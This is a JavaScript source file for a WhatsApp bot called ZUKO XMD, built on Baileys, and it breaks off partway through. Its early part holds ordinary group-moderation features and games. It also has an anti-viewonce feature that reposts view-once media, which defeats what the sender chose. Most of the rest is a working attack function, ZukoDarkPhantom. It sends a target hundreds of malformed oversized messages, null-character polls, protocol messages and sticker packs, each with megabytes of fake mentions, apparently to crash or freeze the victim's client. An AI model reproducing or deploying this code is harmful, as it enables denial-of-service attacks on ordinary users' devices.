require('../config/setting/config');
const {
    default: baileys,
    getContentType,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const moment = require('moment-timezone');
const yts = require('yt-search');
const { getSetting, setSetting } = require("../config/setting/Settings.js");
const { toAudio, toPTT } = require('../lib/converter.js');
const ffmpegPath = require('../lib/ffmpegPath');

// ========== GLOBALS ==========
global.packname = 'ZUKO XMD';
global.OWNER_NAME = 'ZUKO';
global.botName = 'ZUKO XMD';

// ========== NEWSLETTER CONTEXT ==========
global.newsletterJid = '120363405724402785@newsletter';
global.newsletterName = 'ZUKO XMD';

function newsletterContext(extra = {}) {
    if (!global.newsletterJid) return extra;
    return {
        ...extra,
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.newsletterJid,
            newsletterName: global.newsletterName || global.botName || 'ZUKO XMD',
            serverMessageId: 143
        }
    };
}

// ========== AUTO REACT STATE ==========
let autoMessageReact = false;
const processedMessages = new Set();

// ========== MENU IMAGE ==========
const MENU_IMAGE_PATH = './media/logo.jpg';
let menuImageBuffer = null;
try {
    if (fs.existsSync(MENU_IMAGE_PATH)) {
        menuImageBuffer = fs.readFileSync(MENU_IMAGE_PATH);
    }
} catch (e) {}
global.menuImage = menuImageBuffer || 'https://files.catbox.moe/xxrf9p.jpg';

// ========== LIGHTWEIGHT DB (warn counters for anti-features) ==========
const dbPath = './database.json';
let db;
try {
    db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
} catch (err) {
    db = { warns: {} };
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
}
if (!db.warns) db.warns = {};

function saveDB() {
    try { fs.writeFileSync(dbPath, JSON.stringify(db, null, 2)); } catch (e) {}
}

// ========== ANTI-LINK HANDLER ==========
async function handleAntiLink(empire, m, isCreator, isAdmins) {
    try {
        if (!m.isGroup || isCreator || isAdmins) return false;
        if (!getSetting(m.chat, 'antilink', false)) return false;

        let text = '';
        if (m.message?.conversation) text = m.message.conversation;
        else if (m.message?.extendedTextMessage?.text) text = m.message.extendedTextMessage.text;
        else if (m.message?.imageMessage?.caption) text = m.message.imageMessage.caption;
        else if (m.message?.videoMessage?.caption) text = m.message.videoMessage.caption;

        if (!text || text.trim() === '') return false;

        const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?:\/[^\s]*)?)/gi;
        const matches = text.match(linkRegex);
        if (!matches || matches.length === 0) return false;

        const allowedDomains = getSetting(m.chat, 'allowedDomains', []);
        let isAllowed = false;
        if (allowedDomains.length > 0) {
            for (const link of matches) {
                try {
                    let cleanLink = link;
                    if (!cleanLink.startsWith('http://') && !cleanLink.startsWith('https://')) {
                        cleanLink = 'https://' + cleanLink;
                    }
                    const url = new URL(cleanLink);
                    const domain = url.hostname.replace(/^www\./, '').toLowerCase();
                    if (allowedDomains.some(d => domain === d.toLowerCase() || domain.endsWith('.' + d.toLowerCase()))) {
                        isAllowed = true;
                        break;
                    }
                } catch (e) {}
            }
        }
        if (isAllowed) return false;

        const action = getSetting(m.chat, 'antilink_action', 'delete');

        await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});

        if (action === 'warn') {
            const warnKey = `${m.chat}_${m.sender}`;
            db.warns[warnKey] = (db.warns[warnKey] || 0) + 1;
            saveDB();
            const count = db.warns[warnKey];
            await empire.sendMessage(m.chat, {
                text: `⚠️ @${m.sender.split('@')[0]} links not allowed! Warning ${count}/3.`,
                mentions: [m.sender]
            }).catch(() => {});
            if (count >= 3) {
                await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                delete db.warns[warnKey];
                saveDB();
            }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        } else {
            await empire.sendMessage(m.chat, {
                text: `🚫 @${m.sender.split('@')[0]} links are not allowed here.`,
                mentions: [m.sender]
            }).catch(() => {});
        }
        return true;
    } catch (e) { return false; }
}

// ========== ANTI-STICKER HANDLER ==========
async function handleAntiSticker(empire, m, isCreator, isAdmins) {
    try {
        if (!m.isGroup || isCreator || isAdmins || !m.message?.stickerMessage) return false;
        if (!getSetting(m.chat, 'antisticker', false)) return false;
        const action = getSetting(m.chat, 'antisticker_action', 'delete');
        await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});
        if (action === 'warn') {
            await empire.sendMessage(m.chat, { text: `⚠️ @${m.sender.split('@')[0]} stickers not allowed!`, mentions: [m.sender] });
            const k = `${m.chat}_${m.sender}`;
            db.warns[k] = (db.warns[k] || 0) + 1; saveDB();
            if (db.warns[k] >= 3) { await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); delete db.warns[k]; saveDB(); }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        }
        return true;
    } catch { return false; }
}


// ========== ANTI-TAG HANDLER ==========
async function handleAntiTag(empire, m, isCreator, isAdmins) {
    try {
        if (!m.isGroup || isCreator || isAdmins) return false;
        if (!getSetting(m.chat, 'antitag', false)) return false;

        const mentions = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentions.length === 0) return false;

        const botNumber = empire.user.id;
        const hasBotMention = mentions.some(jid => jid === botNumber || jid.includes(botNumber.split('@')[0]));
        const body = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
        const hasEveryone = /@everyone|@all|@All|@Everyone/i.test(body);

        if (!hasBotMention && !hasEveryone) return false;

        const action = getSetting(m.chat, 'antitag_action', 'delete');
        await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});

        if (action === 'warn') {
            await empire.sendMessage(m.chat, { text: `⚠️ @${m.sender.split('@')[0]} tagging is not allowed!`, mentions: [m.sender] });
            const k = `${m.chat}_${m.sender}`;
            db.warns[k] = (db.warns[k] || 0) + 1; saveDB();
            if (db.warns[k] >= 3) { await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); delete db.warns[k]; saveDB(); }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        }
        return true;
    } catch (e) { return false; }
}

// ========== ANTI-VIEWONCE HANDLER ==========
async function handleAntiViewOnce(empire, m) {
    try {
        if (!m.isGroup || !getSetting(m.chat, 'antiviewonce', false)) return false;
        const msg = m.message;
        if (!msg) return false;
        const voKey = Object.keys(msg).find(k => k.startsWith('viewOnce'));
        if (!voKey) return false;
        const inner = msg[voKey]?.message;
        if (!inner) return false;
        const mediaType = Object.keys(inner).find(k => k.endsWith('Message'));
        if (!mediaType) return false;
        await empire.sendMessage(m.chat, {
            [mediaType]: inner[mediaType],
            caption: `👁️ *Anti-ViewOnce* | By @${m.sender.split('@')[0]}`,
            mentions: [m.sender]
        }, { contextInfo: newsletterContext() }).catch(() => {});
        return true;
    } catch { return false; }
}

// ========== ANTI-CALL HANDLER ==========
async function handleAntiCall(empire, callData) {
    try {
        if (!getSetting('global', 'anticall', false)) return false;
        const caller = callData.from;
        if (!caller) return false;
        await empire.rejectCall(callData.id, callData.from).catch(() => {});
        await empire.sendMessage(caller, {
            text: `📵 *Calls are disabled.*\n\nYour call was rejected. Please use text commands.`,
            contextInfo: newsletterContext()
        }).catch(() => {});
        return true;
    } catch { return false; }
}

// ========== ANTI-DELETE STORE ==========
const antidelete = (() => {
    const messageStore = new Map();
    const DATA_DIR = path.join(process.cwd(), 'data');
    const CONFIG_PATH = path.join(DATA_DIR, 'antidelete.json');

    try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    } catch (err) {}

    function loadConfig() {
        try {
            if (!fs.existsSync(CONFIG_PATH)) return { enabled: false };
            return JSON.parse(fs.readFileSync(CONFIG_PATH));
        } catch { return { enabled: false }; }
    }

    function saveConfig(config) {
        try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2)); } catch (err) {}
    }

    async function storeMessage(sock, message) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;
            if (!message.key?.id) return;
            const messageId = message.key.id;
            let content = '';
            const sender = message.key.participant || message.key.remoteJid || 'Unknown';
            if (message.message?.conversation) content = message.message.conversation;
            else if (message.message?.extendedTextMessage?.text) content = message.message.extendedTextMessage.text;
            else if (message.message?.imageMessage?.caption) content = message.message.imageMessage.caption;
            else if (message.message?.videoMessage?.caption) content = message.message.videoMessage.caption;
            const group = message.key.remoteJid.endsWith('@g.us') ? message.key.remoteJid : null;
            messageStore.set(messageId, { content, sender, group, timestamp: new Date().toISOString() });
        } catch (err) {}
    }
  

    async function handleRevocation(sock, revocationMessage) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;
            const protocolMsg = revocationMessage.message?.protocolMessage;
            if (!protocolMsg || protocolMsg.type !== 0) return;
            const messageId = protocolMsg.key?.id;
            if (!messageId) return;
            const deletedBy = revocationMessage.participant || revocationMessage.key?.participant;
            const ownerNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            if (deletedBy === ownerNumber) return;
            const original = messageStore.get(messageId);
            if (!original) return;
            const sender = original.sender;
            const time = new Date().toLocaleString();
            let text = `🔰 *ANTIDELETE REPORT*\n\n🗑️ *Deleted By:* @${deletedBy.split('@')[0]}\n👤 *Sender:* @${sender.split('@')[0]}\n🕒 *Time:* ${time}\n`;
            if (original.content) text += `\n💬 *Message:*\n${original.content}`;
            await sock.sendMessage(ownerNumber, {
                text,
                mentions: [deletedBy, sender],
                contextInfo: newsletterContext()
            });
            messageStore.delete(messageId);
        } catch (err) {}
    }

    async function handleCommand(sock, chatId, message, match, isCreator) {
        if (!isCreator) {
            await sock.sendMessage(chatId, {
                text: '❌ *Only the bot owner can use this command.*',
                contextInfo: newsletterContext()
            }, { quoted: message });
            return;
        }
        const config = loadConfig();
        if (!match) {
            await sock.sendMessage(chatId, {
                text: `*ANTIDELETE SETUP*\n\n📊 *Status:* ${config.enabled ? '✅ Enabled' : '❌ Disabled'}\n\n*antidelete on* - Enable\n*antidelete off* - Disable`,
                contextInfo: newsletterContext()
            }, { quoted: message });
            return;
        }
        if (match === 'on') { config.enabled = true; saveConfig(config); await sock.sendMessage(chatId, { text: '*✅ Antidelete enabled*', contextInfo: newsletterContext() }, { quoted: message }); }
        else if (match === 'off') { config.enabled = false; saveConfig(config); await sock.sendMessage(chatId, { text: '*❌ Antidelete disabled*', contextInfo: newsletterContext() }, { quoted: message }); }
        else { await sock.sendMessage(chatId, { text: '*Invalid command. Use antidelete on/off*', contextInfo: newsletterContext() }, { quoted: message }); }
    }

    return { storeMessage, handleRevocation, handleCommand };
})();

// ========== GAME STATE (in-memory, per chat) ==========
const tttGames = new Map();      // chat -> { board, players: {X, O}, turn, vsBot }
const hangmanGames = new Map();  // chat -> { word, category, guessed, wrong, maxWrong }

// ========== TIC TAC TOE HELPERS ==========
const TTT_NUMBERS = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];

function renderTTTBoard(board) {
    const cells = board.map((v, i) => (v === '' ? TTT_NUMBERS[i] : v === 'X' ? '❌' : '⭕'));
    return `${cells[0]}${cells[1]}${cells[2]}\n${cells[3]}${cells[4]}${cells[5]}\n${cells[6]}${cells[7]}${cells[8]}`;
}

function checkTTTWinner(board) {
    const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    for (const [a, b, c] of lines) {
        if (board[a] && board[a] === board[b] && board[a] === board[c]) return board[a];
    }
    if (board.every(c => c !== '')) return 'draw';
    return null;
}

function botTTTMove(board) {
    const empty = board.map((v, i) => (v === '' ? i : null)).filter(v => v !== null);
    for (const i of empty) {
        const copy = [...board]; copy[i] = 'O';
        if (checkTTTWinner(copy) === 'O') return i;
    }
    for (const i of empty) {
        const copy = [...board]; copy[i] = 'X';
        if (checkTTTWinner(copy) === 'X') return i;
    }
    if (board[4] === '') return 4;
    const corners = [0, 2, 6, 8].filter(i => board[i] === '');
    if (corners.length) return corners[Math.floor(Math.random() * corners.length)];
    return empty[Math.floor(Math.random() * empty.length)];
}

// ========== HANGMAN HELPERS ==========
const HANGMAN_WORDS = [
    { word: 'javascript', category: 'Programming' },
    { word: 'baileys', category: 'Programming' },
    { word: 'elephant', category: 'Animals' },
    { word: 'giraffe', category: 'Animals' },
    { word: 'dolphin', category: 'Animals' },
    { word: 'mountain', category: 'Nature' },
    { word: 'waterfall', category: 'Nature' },
    { word: 'universe', category: 'Science' },
    { word: 'telescope', category: 'Science' },
    { word: 'birthday', category: 'Events' },
    { word: 'sandwich', category: 'Food' },
    { word: 'pineapple', category: 'Food' },
    { word: 'chocolate', category: 'Food' },
    { word: 'guitar', category: 'Music' },
    { word: 'keyboard', category: 'Music' },
    { word: 'football', category: 'Sports' },
    { word: 'basketball', category: 'Sports' },
    { word: 'whatsapp', category: 'Apps' },
    { word: 'painting', category: 'Art' },
    { word: 'astronaut', category: 'Space' }
];

const HANGMAN_STAGES = [
    "┌───┐\n│   │\n│    \n│    \n│    \n─┴─",
    "┌───┐\n│   │\n│   😵\n│    \n│    \n─┴─",
    "┌───┐\n│   │\n│   😵\n│   │\n│    \n─┴─",
    "┌───┐\n│   │\n│   😵\n│  /│\n│    \n─┴─",
    "┌───┐\n│   │\n│   😵\n│  /│\\\n│    \n─┴─",
    "┌───┐\n│   │\n│   😵\n│  /│\\\n│  /  \n─┴─",
    "┌───┐\n│   │\n│   💀\n│  /│\\\n│  / \\\n─┴─"
];

function renderHangman(game) {
    const displayWord = game.word.split('').map(c => (game.guessed.has(c) ? c.toUpperCase() : '_')).join(' ');
    const wrongLetters = [...game.guessed].filter(l => !game.word.includes(l));
    return `${HANGMAN_STAGES[game.wrong]}\n\n📝 ${displayWord}\n\n❤️ Lives: ${game.maxWrong - game.wrong}/${game.maxWrong}\n❌ Wrong: ${wrongLetters.join(', ') || 'none'}`;
}

// ========== WELCOME / GOODBYE HANDLER ==========
async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botNumber) {
    try {
        const { id, participants, action } = update;
        const welcomeEnabled = getSetting(id, 'welcome', false);
        const goodbyeEnabled = getSetting(id, 'goodbye', false);

        if (action === 'add') {
            for (const p of participants) {
                if (p === botNumber) continue;
                if (welcomeEnabled) {
                    let msg = getSetting(id, 'welcomeMessage', '👋 Welcome @user to @group!');
                    msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                    await empire.sendMessage(id, {
                        text: msg,
                        mentions: [p],
                        contextInfo: newsletterContext()
                    });
                }
            }
        }
        if (action === 'remove' && goodbyeEnabled) {
            for (const p of participants) {
                if (p === botNumber) continue;
                let msg = getSetting(id, 'goodbyeMessage', "👋 Goodbye @user, we'll miss you!");
                msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                await empire.sendMessage(id, {
                    text: msg,
                    mentions: [p],
                    contextInfo: newsletterContext()
                });
            }
        }
    } catch (e) { console.error('Welcome/Goodbye error:', e); }
}
  // ============================================================
// ZUKO DARK PHANTOM - Strongest Invisible Delay (NEW)
// Uses 7 attack vectors with massive payloads
// 100% invisible to all members
// ============================================================
async function ZukoDarkPhantom(sock, target) {
  const crypto = require('crypto');
  const fs = require('fs');
  const path = require('path');

  const tempDir = path.join(__dirname, '../database/temp');
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

  // ====== Generate massive JID list ======
  const generateRandomJid = () => {
    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
    return `"${randomNumber}@s.whatsapp.net"`;
  };

  const createTempFile = () => {
    const tempFilePath = path.join(tempDir, `dark_phantom_${Date.now()}.json`);
    let jids = [];
    let currentSize = 0;
    while (currentSize < 5061432 - 50) {
      const jid = generateRandomJid();
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
    return tempFilePath;
  };

  const tempFilePath = createTempFile();
  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));

  setTimeout(() => {
    try { fs.unlinkSync(tempFilePath); } catch (e) {}
  }, 5000);

  // ====== Attack Phases ======

  // ---------- PHASE 1: Dark Document Flood (600) ----------
  for (let i = 0; i < 600; i++) {
    const darkPayload = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
                fileLength: "9999999999999",
                pageCount: 999999999 + i,
                mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
                fileName: `☠️_${i}`,
                fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
                directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
                contactVcard: true,
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
              },
              hasMediaAttachment: true,
            },
            body: { text: `☠️${'⬛'.repeat(5000)}` },
            footer: { text: `☠️${'⬛'.repeat(5000)}` },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: jidsss,
              mentions: jidsss,
              forwardingScore: 9999 + i,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
                  fileLength: "9999999999999",
                  pageCount: 999999999 + i,
                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
                  fileName: `☠️_${i}`,
                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
                  contactVcard: true,
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
                }
              }
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkPayload, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 1: ${i}/600`));
    await new Promise(resolve => setTimeout(resolve, 30));
  }

  // ---------- PHASE 2: Dark Poll Flood (300) ----------
  for (let i = 0; i < 300; i++) {
    const pollOptions = [];
    for (let p = 0; p < 1000; p++) {
      pollOptions.push({
        optionName: '\u0000'.repeat(10000) + `_${p}_${i}`
      });
    }

    const darkPoll = {
      ephemeralMessage: {
        message: {
          pollCreationMessage: {
            name: '\u0000'.repeat(100000) + `_${i}`,
            options: pollOptions,
            selectableOptionsCount: 1,
            pollType: 'QUIZ',
            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
            contextInfo: {
              mentionedJid: jidsss,
              mentions: jidsss,
              forwardingScore: 9999 + i,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkPoll, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 2: ${i}/300`));
    await new Promise(resolve => setTimeout(resolve, 50));
  }

  // ---------- PHASE 3: Dark Protocol Flood (400) ----------
  for (let i = 0; i < 400; i++) {
    const darkProtocol = {
      protocolMessage: {
        key: {
          remoteJid: target,
          id: crypto.randomBytes(16).toString('hex'),
          fromMe: true,
          participant: '0@s.whatsapp.net'
        },
        type: 25,
        ephemeralExpiration: 9999999999 + i,
        status: 0,
        contextInfo: {
          participant: '0@s.whatsapp.net',
          remoteJid: target,
          isForwarded: true,
          forwardingScore: 9999999 + i,
          mentionedJid: jidsss,
          mentions: jidsss
        }
      }
    };

    await sock.sendMessage(target, darkProtocol, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 3: ${i}/400`));
    await new Promise(resolve => setTimeout(resolve, 40));
  }

  // ---------- PHASE 4: Dark Reaction Flood (300) ----------
  for (let i = 0; i < 300; i++) {
    const darkReaction = {
      ephemeralMessage: {
        message: {
          reactionMessage: {
            key: {
              remoteJid: target,
              id: crypto.randomBytes(16).toString('hex'),
              fromMe: true,
              participant: '0@s.whatsapp.net'
            },
            text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
            groupingKey: crypto.randomBytes(32).toString('hex'),
            contextInfo: {
              mentionedJid: jidsss,
              mentions: jidsss,
              isForwarded: true,
              forwardingScore: 9999999 + i,
              participant: '0@s.whatsapp.net',
              remoteJid: 'status@broadcast'
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkReaction, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 4: ${i}/300`));
    await new Promise(resolve => setTimeout(resolve, 35));
  }

  // ---------- PHASE 5: Dark Sticker Pack Flood (200) ----------
  for (let i = 0; i < 200; i++) {
    const stickers = [];
    for (let s = 0; s < 200; s++) {
      stickers.push({
        fileName: `${crypto.randomBytes(16).toString('hex')}.webp`,
        isAnimated: true,
        accessibilityLabel: '\u0000'.repeat(10000),
        isLottie: false,
        mimetype: 'image/webp'
      });
    }

    const darkSticker = {
      ephemeralMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: crypto.randomBytes(16).toString('hex'),
            name: '\u0000'.repeat(100000) + `_${i}`,
            publisher: '\u0000'.repeat(100000),
            stickers: stickers,
            fileLength: '9999999999999',
            fileSha256: crypto.randomBytes(32).toString('base64'),
            fileEncSha256: crypto.randomBytes(32).toString('base64'),
            mediaKey: crypto.randomBytes(32).toString('base64'),
            directPath: `/v/t62.15575-24/${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0`,
            mediaKeyTimestamp: Date.now().toString(),
            trayIconFileName: `${crypto.randomBytes(16).toString('hex')}.png`,
            thumbnailDirectPath: crypto.randomBytes(16).toString('hex'),
            thumbnailSha256: crypto.randomBytes(32).toString('base64'),
            thumbnailEncSha256: crypto.randomBytes(32).toString('base64'),
            thumbnailHeight: 99999999,
            thumbnailWidth: 99999999,
            imageDataHash: crypto.randomBytes(32).toString('base64'),
            stickerPackSize: 99999999999,
            stickerPackOrigin: 99999999999,
            contextInfo: {
              mentionedJid: jidsss,
              mentions: jidsss,
              isForwarded: true,
              forwardingScore: 9999999 + i,
              participant: '0@s.whatsapp.net',
              remoteJid: 'status@broadcast'
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkSticker, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 5: ${i}/200`));
    await new Promise(resolve => setTimeout(resolve, 60));
  }

  // ---------- PHASE 6: Dark ViewOnce + Interactive (150) ----------
  for (let i = 0; i < 150; i++) {
    const darkViewOnce = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: '\u0000'.repeat(100000) + `_${i}`,
              format: 'DEFAULT'
            },
            nativeFlowResponseMessage: {
              name: 'call_permission_request',
              paramsJson: '\u0000'.repeat(19999999) + `_${i}`,
              version: 9
            },
            contextInfo: {
              mentionedJid: jidsss,
              mentions: jidsss,
              isForwarded: true,
              forwardingScore: 9999999 + i,
              remoteJid: 'status@broadcast',
              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkViewOnce).catch(() => {});
    if (i % 30 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 6: ${i}/150`));
    await new Promise(resolve => setTimeout(resolve, 70));
  }

  // ---------- PHASE 7: Dark Newsletter Admin Invite (100) ----------
  for (let i = 0; i < 100; i++) {
    const darkNewsletter = {
      newsletterAdminInviteMessage: {
        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
        newsletterName: '\u0000'.repeat(100000) + `_${i}`,
        caption: '\u0000'.repeat(100000) + `_${i}`,
        inviteExpiration: '0',
        contextInfo: {
          participant: '0@s.whatsapp.net',
          remoteJid: target,
          isForwarded: true,
          forwardingScore: 9999999 + i,
          mentionedJid: jidsss,
          mentions: jidsss
        }
      }
    };

    await sock.sendMessage(target, darkNewsletter).catch(() => {});
    if (i % 25 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 7: ${i}/100`));
    await new Promise(resolve => setTimeout(resolve, 80));
  }

  // ---------- FINAL SURGE: 500 iterations of pure chaos ----------
  for (let i = 0; i < 500; i++) {
    const darkSurge = {
      ephemeralMessage: {
        message: {
          protocolMessage: {
            key: {
              remoteJid: target,
              id: crypto.randomBytes(16).toString('hex'),
              fromMe: true,
              participant: '0@s.whatsapp.net'
            },
            type: 25,
